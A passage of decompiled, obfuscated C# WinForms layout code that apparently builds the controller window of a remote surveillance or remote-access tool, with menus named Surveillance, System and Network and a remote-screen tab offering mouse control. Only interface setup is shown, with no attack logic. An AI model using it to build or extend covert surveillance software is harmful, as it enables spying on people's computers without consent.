        this.vmethod_311(new ToolStripStatusLabel());
        this.vmethod_313(new ToolStripStatusLabel());
        this.vmethod_333(new ContextMenuStrip(this.icontainer_0));
        this.vmethod_345(new ToolStripMenuItem());
        this.vmethod_347(new ToolStripSeparator());
        this.vmethod_335(new ToolStripMenuItem());
        this.vmethod_337(new ToolStripSeparator());
        this.vmethod_339(new ToolStripMenuItem());
        this.vmethod_351(new TabPage());
        this.vmethod_711(new VisualButton());
        this.vmethod_511(new RichTextBox());
        this.vmethod_353(new RichTextBox());
        this.vmethod_359(new TabPage());
        this.vmethod_513(new ZeroitProgressIndicator());
        this.vmethod_495(new StatusStrip());
        this.vmethod_497(new ToolStripStatusLabel());
        this.vmethod_499(new ToolStripStatusLabel());
        this.vmethod_501(new ToolStripStatusLabel());
        this.vmethod_503(new ToolStripStatusLabel());
        this.vmethod_505(new ToolStripStatusLabel());
        this.vmethod_677(new ToolStripStatusLabel());
        this.vmethod_507(new ToolStripProgressBar());
        this.vmethod_361(new ContextMenuStrip(this.icontainer_0));
        this.vmethod_363(new ToolStripMenuItem());
        this.vmethod_367(new ToolStripSeparator());
        this.vmethod_371(new ToolStripMenuItem());
        this.vmethod_375(new ToolStripMenuItem());
        this.vmethod_443(new ToolStripSeparator());
        this.vmethod_373(new ToolStripMenuItem());
        this.vmethod_377(new ToolStripSeparator());
        this.vmethod_369(new ToolStripMenuItem());
        this.vmethod_379(new ToolStripMenuItem());
        this.vmethod_417(new TabPage());
        this.vmethod_469(new StatusStrip());
        this.vmethod_471(new ToolStripStatusLabel());
        this.vmethod_421(new ContextMenuStrip(this.icontainer_0));
        this.vmethod_423(new ToolStripMenuItem());
        this.vmethod_425(new ToolStripSeparator());
        this.vmethod_427(new ToolStripMenuItem());
        this.vmethod_429(new ToolStripMenuItem());
        this.vmethod_431(new ToolStripSeparator());
        this.vmethod_433(new ToolStripMenuItem());
        this.vmethod_461(new TabPage());
        this.vmethod_715(new VisualScrollBar());
        this.vmethod_709(new VisualButton());
        this.vmethod_685(new CheckBox());
        this.vmethod_679(new CheckBox());
        this.vmethod_515(new Label());
        this.vmethod_517(new Label());
        this.vmethod_467(new RichTextBox());
        this.vmethod_463(new Label());
        this.vmethod_521(new TabPage());
        this.vmethod_541(new StatusStrip());
        this.vmethod_543(new ToolStripStatusLabel());
        this.vmethod_675(new ToolStripStatusLabel());
        this.vmethod_545(new ToolStripProgressBar());
        this.vmethod_547(new ZeroitProgressIndicator());
        this.vmethod_525(new ContextMenuStrip(this.icontainer_0));
        this.vmethod_527(new ToolStripMenuItem());
        this.vmethod_529(new ToolStripSeparator());
        this.vmethod_531(new ToolStripMenuItem());
        this.vmethod_533(new ToolStripMenuItem());
        this.vmethod_535(new ToolStripSeparator());
        this.vmethod_537(new ToolStripMenuItem());
        this.vmethod_539(new ToolStripSeparator());
        this.vmethod_597(new ToolStripMenuItem());
        this.vmethod_565(new TabPage());
        this.vmethod_567(new ZeroitProgressIndicator());
        this.vmethod_569(new StatusStrip());
        this.vmethod_571(new ToolStripStatusLabel());
        this.vmethod_665(new ToolStripStatusLabel());
        this.vmethod_573(new ToolStripStatusLabel());
        this.vmethod_667(new ToolStripStatusLabel());
        this.vmethod_575(new ToolStripProgressBar());
        this.vmethod_581(new ContextMenuStrip(this.icontainer_0));
        this.vmethod_583(new ToolStripMenuItem());
        this.vmethod_585(new ToolStripSeparator());
        this.vmethod_599(new ToolStripMenuItem());
        this.vmethod_601(new ToolStripMenuItem());
        this.vmethod_603(new ToolStripMenuItem());
        this.vmethod_605(new ToolStripMenuItem());
        this.vmethod_607(new ToolStripMenuItem());
        this.vmethod_609(new ToolStripSeparator());
        this.vmethod_611(new ToolStripMenuItem());
        this.vmethod_595(new ToolStripSeparator());
        this.vmethod_587(new ToolStripMenuItem());
        this.vmethod_589(new ToolStripMenuItem());
        this.vmethod_591(new ToolStripSeparator());
        this.vmethod_593(new ToolStripMenuItem());
        this.vmethod_613(new TabPage());
        this.vmethod_615(new ZeroitProgressIndicator());
        this.vmethod_617(new StatusStrip());
        this.vmethod_619(new ToolStripStatusLabel());
        this.vmethod_673(new ToolStripStatusLabel());
        this.vmethod_621(new ToolStripProgressBar());
        this.vmethod_629(new ContextMenuStrip(this.icontainer_0));
        this.vmethod_631(new ToolStripMenuItem());
        this.vmethod_633(new ToolStripSeparator());
        this.vmethod_635(new ToolStripMenuItem());
        this.vmethod_637(new ToolStripMenuItem());
        this.vmethod_639(new ToolStripMenuItem());
        this.vmethod_641(new ToolStripMenuItem());
        this.vmethod_643(new ToolStripMenuItem());
        this.vmethod_659(new ToolStripMenuItem());
        this.vmethod_661(new ToolStripSeparator());
        this.vmethod_663(new ToolStripMenuItem());
        this.vmethod_645(new ToolStripSeparator());
        this.vmethod_647(new ToolStripMenuItem());
        this.vmethod_649(new ToolStripSeparator());
        this.vmethod_651(new ToolStripMenuItem());
        this.vmethod_653(new ToolStripMenuItem());
        this.vmethod_655(new ToolStripSeparator());
        this.vmethod_657(new ToolStripMenuItem());
        this.vmethod_723(new TabPage());
        this.vmethod_755(new ZeroitProgressIndicator());
        this.vmethod_733(new StatusStrip());
        this.vmethod_735(new ToolStripStatusLabel());
        this.vmethod_737(new ToolStripStatusLabel());
        this.vmethod_739(new ToolStripStatusLabel());
        this.vmethod_741(new ToolStripStatusLabel());
        this.vmethod_743(new ToolStripProgressBar());
        this.vmethod_745(new VisualButton());
        this.vmethod_747(new ComboBox());
        this.vmethod_767(new ContextMenuStrip(this.icontainer_0));
        this.vmethod_769(new ToolStripMenuItem());
        this.vmethod_771(new ToolStripSeparator());
        this.vmethod_773(new ToolStripMenuItem());
        this.vmethod_759(new ContextMenuStrip(this.icontainer_0));
        this.vmethod_761(new ToolStripMenuItem());
        this.vmethod_763(new ToolStripSeparator());
        this.vmethod_765(new ToolStripMenuItem());
        this.vmethod_779(new TabPage());
        this.vmethod_809(new Label());
        this.vmethod_795(new Label());
        this.vmethod_789(new TextBox());
        this.vmethod_791(new Label());
        this.vmethod_781(new VisualButton());
        this.vmethod_783(new VisualButton());
        this.vmethod_785(new TextBox());
        this.vmethod_787(new Label());
        this.vmethod_119(new ImageList(this.icontainer_0));
        this.vmethod_73(new ContextMenuStrip(this.icontainer_0));
        this.vmethod_75(new ToolStripMenuItem());
        this.vmethod_283(new BackgroundWorker());
        this.vmethod_289(new Timer(this.icontainer_0));
        this.vmethod_341(new SaveFileDialog());
        this.vmethod_343(new Timer(this.icontainer_0));
        this.vmethod_561(new BackgroundWorker());
        this.vmethod_669(new Timer(this.icontainer_0));
        this.vmethod_775(new BackgroundWorker());
        this.vmethod_793(new Timer(this.icontainer_0));
        this.vmethod_811(new BackgroundWorker());
        this.vmethod_249(new PictureBox());
        this.vmethod_25(new PictureBox());
        this.vmethod_121(new ZeroitAnidasoCircleProgress());
        this.vmethod_519(new Button());
        this.vmethod_473(new ZeroitAnidasoCircleProgress());
        this.vmethod_453(new Button());
        this.vmethod_451(new Button());
        this.vmethod_449(new Button());
        this.vmethod_447(new Button());
        this.vmethod_265(new PictureBox());
        this.vmethod_291(new ZeroitAnidasoCircleProgress());
        this.vmethod_365(new ZeroitAnidasoCircleProgress());
        this.vmethod_683(new PictureBox());
        this.vmethod_681(new PictureBox());
        this.vmethod_465(new PictureBox());
        this.vmethod_549(new ZeroitAnidasoCircleProgress());
        this.vmethod_577(new ZeroitAnidasoCircleProgress());
        this.vmethod_623(new ZeroitAnidasoCircleProgress());
        this.vmethod_753(new ZeroitAnidasoCircleProgress());
        this.vmethod_725(new Button());
        this.vmethod_727(new Button());
        this.vmethod_729(new Button());
        this.vmethod_731(new Button());
        this.vmethod_807(new PictureBox());
        this.vmethod_797(new VisualButton());
        this.vmethod_799(new VisualButton());
        this.vmethod_801(new VisualButton());
        this.vmethod_803(new VisualButton());
        this.vmethod_805(new VisualButton());
        this.vmethod_5(new ToolStripMenuItem());
        this.vmethod_325(new ToolStripMenuItem());
        this.vmethod_17(new ToolStripMenuItem());
        this.vmethod_267(new ToolStripMenuItem());
        this.vmethod_273(new ToolStripMenuItem());
        this.vmethod_275(new ToolStripMenuItem());
        this.vmethod_277(new ToolStripSeparator());
        this.vmethod_279(new ToolStripMenuItem());
        this.vmethod_69(new ToolStripMenuItem());
        this.vmethod_31(new ToolStripMenuItem());
        this.vmethod_757(new ToolStripMenuItem());
        this.vmethod_349(new ToolStripMenuItem());
        this.vmethod_563(new ToolStripMenuItem());
        this.vmethod_523(new ToolStripMenuItem());
        this.vmethod_627(new ToolStripMenuItem());
        this.vmethod_357(new ToolStripMenuItem());
        this.vmethod_777(new ToolStripMenuItem());
        this.vmethod_413(new ToolStripMenuItem());
        this.vmethod_415(new ToolStripMenuItem());
        this.vmethod_459(new ToolStripMenuItem());
        this.vmethod_819(new CheckBox());
        this.vmethod_553(new GClass7());
        this.vmethod_79(new GClass7());
        this.vmethod_77(new GClass7());
        this.vmethod_721(new GClass7());
        this.vmethod_389(new GClass7());
        this.vmethod_317(new GClass7());
        this.vmethod_719(new GClass7());
        this.vmethod_419(new GClass7());
        this.vmethod_551(new GClass7());
        this.vmethod_579(new GClass7());
        this.vmethod_625(new GClass7());
        this.vmethod_749(new GClass7());
        this.vmethod_751(new GClass7());
        this.vmethod_0().SuspendLayout();
        this.vmethod_6().SuspendLayout();
        this.vmethod_18().SuspendLayout();
        this.vmethod_20().SuspendLayout();
        this.vmethod_22().SuspendLayout();
        this.vmethod_32().SuspendLayout();
        this.vmethod_122().SuspendLayout();
        this.vmethod_34().SuspendLayout();
        this.vmethod_70().SuspendLayout();
        this.vmethod_396().SuspendLayout();
        this.vmethod_204().SuspendLayout();
        this.vmethod_156().SuspendLayout();
        this.vmethod_110().SuspendLayout();
        this.vmethod_102().SuspendLayout();
        this.vmethod_252().SuspendLayout();
        this.vmethod_270().SuspendLayout();
        this.vmethod_482().SuspendLayout();
        this.vmethod_390().SuspendLayout();
        this.vmethod_284().SuspendLayout();
        this.vmethod_476().SuspendLayout();
        this.vmethod_300().SuspendLayout();
        this.vmethod_308().SuspendLayout();
        this.vmethod_332().SuspendLayout();
        this.vmethod_350().SuspendLayout();
        this.vmethod_358().SuspendLayout();
        this.vmethod_494().SuspendLayout();
        this.vmethod_360().SuspendLayout();
        this.vmethod_416().SuspendLayout();
        this.vmethod_468().SuspendLayout();
        this.vmethod_420().SuspendLayout();
        this.vmethod_460().SuspendLayout();
        this.vmethod_520().SuspendLayout();
        this.vmethod_540().SuspendLayout();
        this.vmethod_524().SuspendLayout();
        this.vmethod_564().SuspendLayout();
        this.vmethod_568().SuspendLayout();
        this.vmethod_580().SuspendLayout();
        this.vmethod_612().SuspendLayout();
        this.vmethod_616().SuspendLayout();
        this.vmethod_628().SuspendLayout();
        this.vmethod_722().SuspendLayout();
        this.vmethod_732().SuspendLayout();
        this.vmethod_766().SuspendLayout();
        this.vmethod_758().SuspendLayout();
        this.vmethod_778().SuspendLayout();
        this.vmethod_72().SuspendLayout();
        ((ISupportInitialize) this.vmethod_248()).BeginInit();
        ((ISupportInitialize) this.vmethod_24()).BeginInit();
        ((ISupportInitialize) this.vmethod_264()).BeginInit();
        ((ISupportInitialize) this.vmethod_682()).BeginInit();
        ((ISupportInitialize) this.vmethod_680()).BeginInit();
        ((ISupportInitialize) this.vmethod_464()).BeginInit();
        ((ISupportInitialize) this.vmethod_806()).BeginInit();
        base.SuspendLayout();
        this.vmethod_0().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_0().Font = new Font("Segoe UI", 9f);
        this.vmethod_0().ImageScalingSize = new Size(0x18, 0x18);
        ToolStripItem[] toolStripItems = new ToolStripItem[] { this.vmethod_2(), this.vmethod_14(), this.vmethod_28(), this.vmethod_354(), this.vmethod_410(), this.vmethod_456() };
        this.vmethod_0().Items.AddRange(toolStripItems);
        this.vmethod_0().Location = new Point(0, 0);
        this.vmethod_0().Name = "tsMenu";
        this.vmethod_0().Padding = new Padding(4, 1, 0, 1);
        this.vmethod_0().Size = new Size(0x3d6, 0x18);
        this.vmethod_0().Stretch = false;
        this.vmethod_0().TabIndex = 0;
        ToolStripItem[] itemArray2 = new ToolStripItem[] { this.vmethod_4() };
        this.vmethod_2().DropDownItems.AddRange(itemArray2);
        this.vmethod_2().Name = "tsGeneral";
        this.vmethod_2().Size = new Size(0x3b, 0x16);
        this.vmethod_2().Text = "General";
        ToolStripItem[] itemArray3 = new ToolStripItem[] { this.vmethod_324(), this.vmethod_16(), this.vmethod_266(), this.vmethod_272() };
        this.vmethod_14().DropDownItems.AddRange(itemArray3);
        this.vmethod_14().Name = "SurveillanceToolStripMenuItem";
        this.vmethod_14().Size = new Size(0x52, 0x16);
        this.vmethod_14().Text = "Surveillance";
        ToolStripItem[] itemArray4 = new ToolStripItem[] { this.vmethod_68(), this.vmethod_30(), this.vmethod_756(), this.vmethod_348(), this.vmethod_562(), this.vmethod_522(), this.vmethod_626() };
        this.vmethod_28().DropDownItems.AddRange(itemArray4);
        this.vmethod_28().Name = "SystemToolStripMenuItem";
        this.vmethod_28().Size = new Size(0x39, 0x16);
        this.vmethod_28().Text = "System";
        ToolStripItem[] itemArray5 = new ToolStripItem[] { this.vmethod_356() };
        this.vmethod_354().DropDownItems.AddRange(itemArray5);
        this.vmethod_354().Name = "NetworkToolStripMenuItem";
        this.vmethod_354().Size = new Size(0x40, 0x16);
        this.vmethod_354().Text = "Network";
        ToolStripItem[] itemArray6 = new ToolStripItem[] { this.vmethod_776(), this.vmethod_412(), this.vmethod_458() };
        this.vmethod_410().DropDownItems.AddRange(itemArray6);
        this.vmethod_410().Name = "MiscToolStripMenuItem";
        this.vmethod_410().Size = new Size(0x2c, 0x16);
        this.vmethod_410().Text = "Misc";
        this.vmethod_456().Alignment = ToolStripItemAlignment.Right;
        this.vmethod_456().Font = new Font("Segoe UI", 8f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_456().ImageScaling = ToolStripItemImageScaling.None;
        this.vmethod_456().Name = "ConnectionTypeToolStripMenuItem";
        this.vmethod_456().Size = new Size(0x4f, 0x16);
        this.vmethod_456().Text = "Connection";
        this.vmethod_6().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_6().ImageScalingSize = new Size(0x18, 0x18);
        ToolStripItem[] itemArray7 = new ToolStripItem[] { this.vmethod_8(), this.vmethod_10(), this.vmethod_12() };
        this.vmethod_6().Items.AddRange(itemArray7);
        this.vmethod_6().Name = "cmsInfo";
        this.vmethod_6().Size = new Size(170, 0x36);
        this.vmethod_8().Name = "tsmInfoRefresh";
        this.vmethod_8().Size = new Size(0xa9, 0x16);
        this.vmethod_8().Text = "Refresh";
        this.vmethod_10().Name = "tsmInfo1";
        this.vmethod_10().Size = new Size(0xa6, 6);
        this.vmethod_12().Name = "tsmInfoCopy";
        this.vmethod_12().Size = new Size(0xa9, 0x16);
        this.vmethod_12().Text = "Copy to clipboard";
        this.vmethod_18().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_18().Appearance = TabAppearance.FlatButtons;
        this.vmethod_18().Controls.Add(this.vmethod_20());
        this.vmethod_18().Controls.Add(this.vmethod_22());
        this.vmethod_18().Controls.Add(this.vmethod_32());
        this.vmethod_18().Controls.Add(this.vmethod_70());
        this.vmethod_18().Controls.Add(this.vmethod_252());
        this.vmethod_18().Controls.Add(this.vmethod_270());
        this.vmethod_18().Controls.Add(this.vmethod_284());
        this.vmethod_18().Controls.Add(this.vmethod_300());
        this.vmethod_18().Controls.Add(this.vmethod_350());
        this.vmethod_18().Controls.Add(this.vmethod_358());
        this.vmethod_18().Controls.Add(this.vmethod_416());
        this.vmethod_18().Controls.Add(this.vmethod_460());
        this.vmethod_18().Controls.Add(this.vmethod_520());
        this.vmethod_18().Controls.Add(this.vmethod_564());
        this.vmethod_18().Controls.Add(this.vmethod_612());
        this.vmethod_18().Controls.Add(this.vmethod_722());
        this.vmethod_18().Controls.Add(this.vmethod_778());
        this.vmethod_18().ItemSize = new Size(0, 1);
        this.vmethod_18().Location = new Point(0, 0x15);
        this.vmethod_18().Margin = new Padding(2);
        this.vmethod_18().Name = "tbControl";
        this.vmethod_18().Padding = new Point(0, 0);
        this.vmethod_18().SelectedIndex = 0;
        this.vmethod_18().Size = new Size(0x3d8, 0x22a);
        this.vmethod_18().SizeMode = TabSizeMode.Fixed;
        this.vmethod_18().TabIndex = 1;
        this.vmethod_20().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_20().Controls.Add(this.vmethod_552());
        this.vmethod_20().Controls.Add(this.vmethod_554());
        this.vmethod_20().ForeColor = Color.Black;
        this.vmethod_20().Location = new Point(4, 5);
        this.vmethod_20().Margin = new Padding(2);
        this.vmethod_20().Name = "tbInfo";
        this.vmethod_20().Padding = new Padding(2);
        this.vmethod_20().Size = new Size(0x3d0, 0x221);
        this.vmethod_20().TabIndex = 0;
        this.vmethod_554().set_BackColor(SystemColors.Control);
        this.vmethod_554().set_CircleWidth(20f);
        this.vmethod_554().set_GetAnimationColor(Color.DeepSkyBlue);
        this.vmethod_554().set_GetAnimationSpeed(100);
        this.vmethod_554().set_GetBaseColor(Color.SkyBlue);
        this.vmethod_554().Location = new Point(0x198, 0xcc);
        this.vmethod_554().MinimumSize = new Size(80, 80);
        this.vmethod_554().Name = "pbInfoSplash";
        this.vmethod_554().set_NumberOfCircles(45f);
        this.vmethod_554().set_Radian(180.0);
        this.vmethod_554().Size = new Size(0xa1, 0xa1);
        this.vmethod_554().set_Smoothing(SmoothingMode.HighQuality);
        this.vmethod_554().TabIndex = 0x2f;
        this.vmethod_554().Visible = false;
        this.vmethod_22().BackColor = Color.Transparent;
        this.vmethod_22().Controls.Add(this.vmethod_688());
        this.vmethod_22().Controls.Add(this.vmethod_686());
        this.vmethod_22().Controls.Add(this.vmethod_86());
        this.vmethod_22().Controls.Add(this.vmethod_26());
        this.vmethod_22().Controls.Add(this.vmethod_292());
        this.vmethod_22().Controls.Add(this.vmethod_250());
        this.vmethod_22().Controls.Add(this.vmethod_246());
        this.vmethod_22().Controls.Add(this.vmethod_98());
        this.vmethod_22().Controls.Add(this.vmethod_100());
        this.vmethod_22().Controls.Add(this.vmethod_94());
        this.vmethod_22().Controls.Add(this.vmethod_96());
        this.vmethod_22().Controls.Add(this.vmethod_92());
        this.vmethod_22().Controls.Add(this.vmethod_80());
        this.vmethod_22().Controls.Add(this.vmethod_82());
        this.vmethod_22().Controls.Add(this.vmethod_84());
        this.vmethod_22().Controls.Add(this.vmethod_88());
        this.vmethod_22().Controls.Add(this.vmethod_90());
        this.vmethod_22().Controls.Add(this.vmethod_248());
        this.vmethod_22().Controls.Add(this.vmethod_24());
        this.vmethod_22().ForeColor = Color.Black;
        this.vmethod_22().Location = new Point(4, 5);
        this.vmethod_22().Margin = new Padding(2);
        this.vmethod_22().Name = "tbScreen";
        this.vmethod_22().Padding = new Padding(2);
        this.vmethod_22().Size = new Size(0x3d0, 0x221);
        this.vmethod_22().TabIndex = 1;
        this.vmethod_688().BackColorState.Disabled = Color.FromArgb(0xcc, 0xcc, 0xcc);
        this.vmethod_688().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_688().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_688().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_688().Border.HoverVisible = true;
        this.vmethod_688().Border.Rounding = 6;
        this.vmethod_688().Border.Thickness = 1;
        this.vmethod_688().Border.Type = ShapeTypes.Rounded;
        this.vmethod_688().Border.Visible = true;
        this.vmethod_688().ButtonBorder.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_688().ButtonBorder.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_688().ButtonBorder.HoverVisible = true;
        this.vmethod_688().ButtonBorder.Rounding = 6;
        this.vmethod_688().ButtonBorder.Thickness = 1;
        this.vmethod_688().ButtonBorder.Type = ShapeTypes.Rounded;
        this.vmethod_688().ButtonBorder.Visible = true;
        this.vmethod_688().ButtonBottomMouseState = MouseStates.Normal;
        this.vmethod_688().ButtonColorState.Disabled = Color.FromArgb(220, 220, 220);
        this.vmethod_688().ButtonColorState.Enabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_688().ButtonColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_688().ButtonColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_688().ButtonTopMouseState = MouseStates.Normal;
        this.vmethod_688().Enabled = false;
        this.vmethod_688().Location = new Point(0x21f, 4);
        this.vmethod_688().Minimum = 1;
        this.vmethod_688().MouseState = MouseStates.Normal;
        this.vmethod_688().Name = "tbScreenQuality";
        this.vmethod_688().Orientation = Orientation.Horizontal;
        this.vmethod_688().Size = new Size(0x52, 0x13);
        this.vmethod_688().TabIndex = 30;
        this.vmethod_688().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_688().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_688().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_688().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_688().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_688().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_688().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_688().ThumbBorder.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_688().ThumbBorder.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_688().ThumbBorder.HoverVisible = true;
        this.vmethod_688().ThumbBorder.Rounding = 6;
        this.vmethod_688().ThumbBorder.Thickness = 1;
        this.vmethod_688().ThumbBorder.Type = ShapeTypes.Rounded;
        this.vmethod_688().ThumbBorder.Visible = true;
        this.vmethod_688().ThumbColorState.Disabled = Color.FromArgb(0xdd, 0xdd, 0xdd);
        this.vmethod_688().ThumbColorState.Enabled = Color.FromArgb(0xdd, 0xdd, 0xdd);
        this.vmethod_688().ThumbColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_688().ThumbColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_688().ThumbGripVisible = true;
        this.vmethod_688().ThumbMouseState = MouseStates.Normal;
        this.vmethod_688().TrackPressed = Color.FromArgb(10, 0, 0, 0);
        this.vmethod_688().Value = 50;
        this.vmethod_686().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_686().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_686().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_686().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_686().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_686().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_686().Border.HoverVisible = true;
        this.vmethod_686().Border.Rounding = 6;
        this.vmethod_686().Border.Thickness = 1;
        this.vmethod_686().Border.Type = ShapeTypes.Rounded;
        this.vmethod_686().Border.Visible = true;
        this.vmethod_686().DialogResult = DialogResult.None;
        this.vmethod_686().Enabled = false;
        this.vmethod_686().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_686().Image = null;
        this.vmethod_686().Location = new Point(1, 7);
        this.vmethod_686().MouseState = MouseStates.Normal;
        this.vmethod_686().Name = "btnScreenStartStop";
        this.vmethod_686().Size = new Size(0x3f, 0x18);
        this.vmethod_686().TabIndex = 0x1d;
        this.vmethod_686().TabStop = false;
        this.vmethod_686().Text = "Start";
        this.vmethod_686().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_686().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_686().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_686().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_686().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_686().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_686().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_686().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_86().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_86().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_86().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_86().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_86().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_86().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_86().Border.HoverVisible = true;
        this.vmethod_86().Border.Rounding = 6;
        this.vmethod_86().Border.Thickness = 1;
        this.vmethod_86().Border.Type = ShapeTypes.Rounded;
        this.vmethod_86().Border.Visible = true;
        this.vmethod_86().DialogResult = DialogResult.None;
        this.vmethod_86().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_86().Image = null;
        this.vmethod_86().Location = new Point(0x15d, 9);
        this.vmethod_86().MouseState = MouseStates.Normal;
        this.vmethod_86().Name = "btnScreenRefresh";
        this.vmethod_86().Size = new Size(0x3a, 0x12);
        this.vmethod_86().TabIndex = 10;
        this.vmethod_86().TabStop = false;
        this.vmethod_86().Text = "Refresh";
        this.vmethod_86().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_86().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_86().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_86().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_86().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_86().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_86().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_86().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_26().Anchor = AnchorStyles.Right | AnchorStyles.Top;
        this.vmethod_26().BackColor = Color.Transparent;
        this.vmethod_26().Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_26().ForeColor = Color.Black;
        this.vmethod_26().Location = new Point(0x2e1, 8);
        this.vmethod_26().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_26().Name = "lblScreenFPS";
        this.vmethod_26().Size = new Size(0xea, 14);
        this.vmethod_26().TabIndex = 7;
        this.vmethod_26().Text = "FPS: N/A";
        this.vmethod_26().TextAlign = ContentAlignment.MiddleRight;
        this.vmethod_292().AutoSize = true;
        this.vmethod_292().BackColor = Color.Transparent;
        this.vmethod_292().Enabled = false;
        this.vmethod_292().ForeColor = Color.Black;
        this.vmethod_292().Location = new Point(0x2fa, 0x19);
        this.vmethod_292().Margin = new Padding(2);
        this.vmethod_292().Name = "chkScreenMoveMouse";
        this.vmethod_292().Size = new Size(0x57, 0x11);
        this.vmethod_292().TabIndex = 0x1c;
        this.vmethod_292().TabStop = false;
        this.vmethod_292().Text = "Move mouse";
        this.vmethod_292().UseVisualStyleBackColor = false;
        this.vmethod_250().BackColor = Color.White;
        this.vmethod_250().DropDownStyle = ComboBoxStyle.DropDownList;
        this.vmethod_250().Enabled = false;
        this.vmethod_250().ForeColor = Color.Black;
        this.vmethod_250().FormattingEnabled = true;
        this.vmethod_250().Location = new Point(0x72, 0x12);
        this.vmethod_250().Margin = new Padding(2);
        this.vmethod_250().Name = "cbScreenMonitorsSecondary";
        this.vmethod_250().Size = new Size(0xe7, 0x15);
        this.vmethod_250().TabIndex = 0x1b;
        this.vmethod_250().TabStop = false;
        this.vmethod_250().Visible = false;
        this.vmethod_246().AutoSize = true;
        this.vmethod_246().BackColor = Color.Transparent;
        this.vmethod_246().Enabled = false;
        this.vmethod_246().ForeColor = Color.Black;
        this.vmethod_246().Location = new Point(0x225, 0x19);
        this.vmethod_246().Margin = new Padding(2);
        this.vmethod_246().Name = "cbScreenDualMonitor";
        this.vmethod_246().Size = new Size(0x4d, 0x11);
        this.vmethod_246().TabIndex = 0x11;
        this.vmethod_246().TabStop = false;
        this.vmethod_246().Text = "Dual mode";
        this.vmethod_246().UseVisualStyleBackColor = false;
        this.vmethod_98().AutoSize = true;
        this.vmethod_98().BackColor = Color.Transparent;
        this.vmethod_98().CausesValidation = false;
        this.vmethod_98().Checked = true;
        this.vmethod_98().Enabled = false;
        this.vmethod_98().ForeColor = Color.Black;
        this.vmethod_98().Location = new Point(0x355, 0x18);
        this.vmethod_98().Margin = new Padding(2);
        this.vmethod_98().Name = "rbScreenColor";
        this.vmethod_98().Size = new Size(0x31, 0x11);
        this.vmethod_98().TabIndex = 0x17;
        this.vmethod_98().TabStop = true;
        this.vmethod_98().Text = "Color";
        this.vmethod_98().UseVisualStyleBackColor = false;
        this.vmethod_100().AutoSize = true;
        this.vmethod_100().BackColor = Color.Transparent;
        this.vmethod_100().CausesValidation = false;
        this.vmethod_100().Enabled = false;
        this.vmethod_100().ForeColor = Color.Black;
        this.vmethod_100().Location = new Point(0x387, 0x18);
        this.vmethod_100().Margin = new Padding(2);
        this.vmethod_100().Name = "rbScreenGrayscale";
        this.vmethod_100().Size = new Size(0x48, 0x11);
        this.vmethod_100().TabIndex = 0x15;
        this.vmethod_100().Text = "Grayscale";
        this.vmethod_100().UseVisualStyleBackColor = false;
        this.vmethod_94().AutoSize = true;
